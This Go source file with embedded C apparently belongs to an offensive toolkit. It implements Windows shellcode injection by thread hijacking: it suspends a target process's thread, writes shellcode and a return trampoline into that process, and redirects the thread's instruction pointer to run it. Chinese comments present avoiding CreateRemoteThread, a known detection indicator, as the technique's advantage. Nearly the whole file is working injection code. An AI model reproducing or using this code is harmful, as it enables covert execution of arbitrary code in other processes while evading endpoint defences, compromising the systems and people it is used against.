//go:build windows && amd64 && cgo

package inject

/*
#cgo LDFLAGS: -luser32
#include <windows.h>
#include <tlhelp32.h>

// Thread hijacking: suspend thread, get/set context, resume thread.
int thread_hijack_inject(
    int pid,
    unsigned char* shellcode,
    int shellcodeLen
) {

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProcess) return -1;

    // Enumerate threads of the target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return -2;
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    BOOL found = FALSE;
    DWORD targetTid = 0;

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == (DWORD)pid) {
                targetTid = te.th32ThreadID;
                found = TRUE;
                break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        CloseHandle(hProcess);
        return -3;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    if (!hThread) {
        CloseHandle(hProcess);
        return -4;
    }

    // Suspend the thread
    DWORD suspendCount = SuspendThread(hThread);
    if (suspendCount == (DWORD)-1) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -5;
    }

    // Allocate memory in target process (shellcode + 14-byte trampoline)
    SIZE_T allocSize = (SIZE_T)shellcodeLen + 14;
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -6;
    }

    // Write shellcode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode,
                            (SIZE_T)shellcodeLen, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -7;
    }

    // Change protection to RX
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, allocSize,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -8;
    }

    // Modify thread context — save original RIP for return
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -9;
    }

    DWORD64 originalRip = ctx.Rip;

    // Build trampoline after shellcode:
    // jmp [rip+6] — absolute indirect jump to originalRip
    // Layout: FF 25 00 00 00 00 | <8 bytes originalRip>
    LPVOID trampolineAddr = (LPVOID)((SIZE_T)remoteAddr + (SIZE_T)shellcodeLen);
    unsigned char trampoline[14];
    trampoline[0] = 0xFF;  // jmp
    trampoline[1] = 0x25;  // [rip+disp32]
    trampoline[2] = 0x00;  // disp32 = 0
    trampoline[3] = 0x00;
    trampoline[4] = 0x00;
    trampoline[5] = 0x00;
    memcpy(&trampoline[6], &originalRip, 8);

    // Write trampoline to remote memory
    SIZE_T trampWritten = 0;
    if (!WriteProcessMemory(hProcess, trampolineAddr, trampoline,
                            14, &trampWritten)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -11;
    }

    // Make trampoline executable too
    DWORD trampOldProtect;
    VirtualProtectEx(hProcess, trampolineAddr, 14, PAGE_EXECUTE_READ, &trampOldProtect);

    ctx.Rip = (DWORD64)remoteAddr;

    if (!SetThreadContext(hThread, &ctx)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -10;
    }

    // Resume thread — shellcode executes
    ResumeThread(hThread);

    // Don't close handles yet — shellcode is running in the hijacked thread
    // Caller should close hProcess and hThread when done
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
*/
import "C"

import (
	"fmt"
	"unsafe"
)

// InjectViaThreadHijack 使用线程劫持方式注入 shellcode 到目标进程。
//
// 原理：
//  1. 枚举目标进程的线程
//  2. 挂起第一个找到的线程
//  3. 在目标进程分配内存并写入 shellcode
//  4. 修改线程上下文 RIP 指向 shellcode
//  5. 恢复线程执行
//
// 优势：无需创建远程线程（CreateRemoteThread 是常见 IOC），
// 劫持已有线程看起来更像正常进程行为。
func InjectViaThreadHijack(cfg *InjectConfig) *InjectResult {
	if cfg.PID <= 0 || len(cfg.Shellcode) == 0 {
		return &InjectResult{
			Success: false,
			Message: "invalid pid or empty shellcode",
		}
	}

	ret := C.thread_hijack_inject(
		C.int(cfg.PID),
		(*C.uchar)(unsafe.Pointer(&cfg.Shellcode[0])),
		C.int(len(cfg.Shellcode)),
	)

	if ret != 0 {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("thread hijack failed: code=%d", int(ret)),
		}
	}

	return &InjectResult{
		Success: true,
		Message: fmt.Sprintf("shellcode injected via thread hijack (pid=%d)", cfg.PID),
	}
}
